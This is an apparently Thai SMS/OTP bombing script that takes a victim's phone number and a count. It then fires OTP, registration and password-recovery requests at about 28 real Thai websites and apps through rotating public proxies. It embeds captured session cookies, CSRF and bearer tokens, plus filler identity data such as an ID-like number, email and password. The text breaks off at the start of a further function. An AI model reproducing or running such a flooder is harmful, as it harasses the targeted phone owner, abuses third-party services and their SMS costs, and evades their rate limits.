import itertools
import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
import pystyle
from pystyle import Colors, Colorate
from concurrent.futures import ThreadPoolExecutor
import random
from re import search
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session,post,get
os.system("clear")


colorsPool = itertools.cycle([27, 33, 69, 74, 74, 73, 73, 73, 78, 114, 114, 113, 113, 155, 155, 155, 155, 155, 155, 191, 191, 185, 185, 185, 185, 185, 185, 221, 221, 221, 221, 221, 215, 215, 215, 209, 209, 209, 203, 203, 203, 204, 204, 204, 198, 198, 129, 129, 135, 99, 99, 99, 99, 63, 63, 63, 63, 69, 69, 69])
def printx(input):print('[\x1b[38;5;%sm%s\x1b[0m] %s' % (next(colorsPool), datetime.datetime.now().strftime('%H:%M:%S'), input))




#อย่าลบเพื่อกันipหลุด
threading = ThreadPoolExecutor(max_workers=int(100000000))
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()
              
#แก้ได้
def KLOP():
	print('''
\x1b[31m85api+call1apiตึงๆ
\033[92mFB:Suthiphat Supirab 
\033[92mGitHub:https://github.com/KLOP16480
\033[92mคนทำบีมคุง
\033[92mของฟรีห้ามขายแต่แกะapiได้
	''')
	
	phone = input(" \x1b[96mเบอร์  : \x1b[92m")
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		print()
		print('\x1b[92m[ ไม่มีเบอร์นี้ ]\x1b[00m : \x1b[91mต้องเป็นเบอร์ไทยเท่านั่น [ ! ] \x1b[00m')
		time.sleep(1)
		os.system('clear')
	else:
		phone = phone
		amount = int(input("\x1b[96m จำนวน : \x1b[92m"))
		amount = amount
		print()
		print()
		KLOPP(phone, amount)
		
		
def api1(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	send = Session()
	send.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
	sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
	if sms.status_code == 200 or sms.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api2(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api3(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api4(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
	
def api5(phone):
	token,_=ig_token()
	d=post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
	
	
def api6(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
	
def api7(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api8(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
	
def api9(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
	
def api10(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
	
def api11(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
	
def api12(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api13(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",headers={"authorization": "Basic d2ViQXBwOndlYkFwcA==","content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},data=f"phone={phone[1:]}&type=1",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api14(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api15(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","cookie": "_gcl_au=1.1.628507904.1657519113;_cbclose=1;_cbclose26068=1;_uid26068=51BC4E60.1;_ctout26068=1;verify=test;_ga=GA1.2.682897436.1657519114;_gid=GA1.2.1721036016.1657519114;_gat_UA-86733131-1=1;_fbp=fb.1.1657519114976.1588263006;afUserId=64e5ba75-c9e2-4e45-aa62-7f5318ec6d9c-p;AF_SYNC=1657519116965;_ga_R05PJC3ZG8=GS1.1.1657519113.1.1.1657519130.43;OptanonAlertBoxClosed=2022-07-11T05:58:54.186Z;OptanonConsent=isIABGlobal=false&datestamp=Mon+Jul+11+2022+12%3A58%3A54+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1"},json={"msisdn":phone,"function":"enroll"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api16(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	session = Session()
	ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
	r = session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api17(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp-login/",headers={"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=080ugg4928ulkhj6kaggiqkvd1; _ga=GA1.3.1856390916.1657557339; _gid=GA1.3.1103002458.1657557339; _gat_gtag_UA_141105037_1=1; G_ENABLED_IDPS=google"},data=f"phone_number={phone}&lag=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api18(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api19(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api20(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.msport1688.com/auth/otp_sender",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "msp_ss_client=4a4nipncnp9l5ced7k5v7rrs9hdnscda;_ga=GA1.1.72563414.1657611524;_ga_1YLLB0C2FF=GS1.1.1657611524.1.1.1657611527.0"},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api21(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://ep789bet.net/auth/send_otp",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api22(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": generate_user_agent(),"x-requested-with": "XMLHttpRequest","x-csrf-token": "d6VfYNo3-RJK5IK0axoCE7KLIAPbW9K0IbL8","x-xsrf-token": "b2b9a4f732d05668c61e64f836417f67/iS0TaMFdXciRQYns4jNXpeVYy3DlvGY6ML+q8oquXvseUvcnIelmUwwR9/wJHKHjGKfN0+WS9orN1zdtt4J3I72qJ3x4Va07eBC0isPMu4ktiZw5DvLcobqJ9l39rFP"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api23(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.jdbaa.com/api/otp-not-captcha",headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_ga=GA1.2.139524076.1653888756;_hjSessionUser_1879787=eyJpZCI6IjczNjVhMTYxLTFkNzktNWVjYS04N2M4LTc3ZTk3ODUyY2U3ZiIsImNyZWF0ZWQiOjE2NTM4ODg3NTc4ODksImV4aXN0aW5nIjp0cnVlfQ==;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95;connect.sid=s%3AiV4V1-65FA5rpJyEObOITUh2fyDcYhen.aclXEUqD4Qe5nlUYVG0mb1zIAC4OuxP4FWCX6%2B8E9WU;io=c7ilAXG_QnIDDz0xAKH5;countdown_lotto_th=345759;_gid=GA1.2.626569110.1657612643;_gat_gtag_UA_139533742_1=1;_hjIncludedInSessionSample=0;_hjSession_1879787=eyJpZCI6ImVjMzQ5NWNiLTIwOGQtNGViYS1hNmY3LTY2ZDVhM2JhMGNmZCIsImNyZWF0ZWQiOjE2NTc2MTI2NDUyMzEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;modal_htd=true;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95"},json={"phone_number":phone,"user_id":f"ak{phone}"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api24(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api25(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api26(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api27(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	SEND  = ru.Session()
	API_WEB = SEND.get('https://app.khonde.com/register',headers={"User-Agent": generate_user_agent()}).text
	SEND_TOKEN = bs(API_WEB,'html.parser')
	TOKEN = SEND_TOKEN.find("meta",attrs={"name":"csrf-token"})
	r = SEND.get(f'https://app.khonde.com/requestOTP/{phone}',headers={"X-XSRF-TOKEN": TOKEN['content'],"User-Agent": generate_user_agent(),"Cookie": "_gid=GA1.2.1429375693.1657960248; _gac_UA-74972330-26=1.1657960248.CjwKCAjww8mWBhABEiwAl6-2RVYe9XsjIIksM_BccLyzFFDX8T_YVTKKPOe2Q0BPyoTwjuzYwh6EyBoCN7wQAvD_BwE; _gat_gtag_UA_74972330_26=1; _fbp=fb.1.1657960248320.1708448457; _tt_enable_cookie=1; _ttp=da5ea560-0a16-4bc0-90d1-3ddd1fc73db4; XSRF-TOKEN=eyJpdiI6IisyMWw5ZnhaS2JXV3FmR3dyV0JGdVE9PSIsInZhbHVlIjoiQnNLQjh6dExTdmh5ZnJZeHNjNkkzd3dMMHpXV1dZV2hROXYyV0NMSnZpOWdQeFdqRU9RQ3Y4M2Y1aXk5Y1QvcFM1V2N0MG9oRUkxQUU3TlFESDlVU21Qa2JMMmxqRHBISFRsOXZGaFVMVGY0ZW1idysrWUVlNTFQWDYvQ1NSWFgiLCJtYWMiOiI1ODRiNTRmOGJkMzRjMzE1YmUxMmQ2Y2NkZWRhOGQ5ZDkwM2MxYWNjMmVmOTk2MzE4MmYzYmQ3ZWFiYWQ1ZjBlIn0%3D; khonde_session=eyJpdiI6IlMyNmpkRWl4NTh1emFLRWNiL0k2ZlE9PSIsInZhbHVlIjoiSEUzNGNnMVFwNGxJNTZVNmVzMWtrQk82NDZ0eGM1ckxrK3VVS1BWZ1NOMDlmbWl5RXdpa2dDMzQrdzIvMkRZeFpwa2dGamdGcFYwcVZWVjhFSjg2elZ1OUFxTWhuV3hIZlV2cFVIVW9VMnBCUEIxVUV6MVp1Y3JPb3JBOXFZeCsiLCJtYWMiOiJiYzM2ZDVhOWFiOTY3NTAyN2RhYTI1NWYwYjZhY2RmYTgxNWRmOGJkOWJhYjcyMGVhYzU0MjE4NGYxYjdlMTU4In0%3D; _ga_X6J1S6LV1V=GS1.1.1657960251.1.0.1657960251.60; _ga=GA1.1.1429094721.1657960248"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api28(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://gamingnation.dtac.co.th/api/otp/request",headers={"User-Agent": generate_user_agent(),"Cookie": "auth.strategy=local; i18n_redirected=th; _gcl_au=1.1.265124296.1661273714; _ga=GA1.3.1857579863.1661273717; _gid=GA1.3.1514915490.1661273717; _fbp=fb.2.1661273718125.787639535; _tt_enable_cookie=1; _ttp=7e4a2162-1ab4-41a0-8b77-e1188cda6a3a; _hjSessionUser_2510409=eyJpZCI6ImVkM2I0OWU2LTBjODQtNWU1ZC04OWIzLTZlMjk5NGFhMWE3NCIsImNyZWF0ZWQiOjE2NjEyNzM3MTc5MzcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjA4YjEyYTNlLTExNjgtNDNlMS05NTVmLWMyMWY2OTU5MGFiYyIsImNyZWF0ZWQiOjE2NjEyNzM3MTgzMTksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _gat_UA-16732483-1=1"},json={"template":"register","phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api29(phone):
